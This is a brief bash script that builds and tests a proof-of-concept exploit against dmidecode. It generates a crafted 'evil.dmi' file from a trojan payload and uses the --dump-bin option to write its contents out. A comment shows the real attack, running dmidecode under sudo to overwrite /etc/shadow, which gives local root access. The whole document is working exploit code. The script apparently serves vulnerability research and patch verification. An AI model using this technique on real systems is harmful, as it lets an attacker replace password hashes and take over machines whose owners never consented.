#!/bin/bash

# This script will compile and test the exploit.
# On the vulnerable system, execution will look something like this:
#
# sudo dmidecode -d evil.dmi --dump-bin /etc/shadow
#

set -o nounset
set -o errexit

payload_file='trojan_shadow.in'
write_file='trojan_shadow.out'

# the crafted DMI file to generate
dmi_file='evil.dmi'

# this option is not present on older versions of dmidecode
flags="--no-sysfs"

rm -f "${dmi_file}" "${write_file}"

make dmiwrite

./dmiwrite "${payload_file}" "${dmi_file}"

dmidecode "${flags}" -d "${dmi_file}" --dump-bin "${write_file}"

